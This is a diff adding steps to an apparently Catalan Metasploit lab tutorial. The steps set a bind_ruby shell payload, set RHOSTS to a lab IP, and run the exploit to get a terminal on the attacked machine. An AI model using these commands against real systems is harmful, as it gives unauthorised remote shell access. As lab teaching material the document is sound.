@@ -27,3 +27,21 @@ show payloads
 set payload cmd/unix/bind_ruby
 ````
 ![use](img/payload.png)
+
+Instructions:
+
+````
+show options
+set RHOSTS 10.0.2.5
+(Modifica 10.0.2.5 per la IP de la màquina a atacar)
+````
+
+![show](img/show.png)
+
+`````
+Kali: Executeu l'exploit:
+
+exploit
+A partir d'ara hem obtingut una terminal en la màquina atacada.
+`````
+![exploit](img/exploit.png)
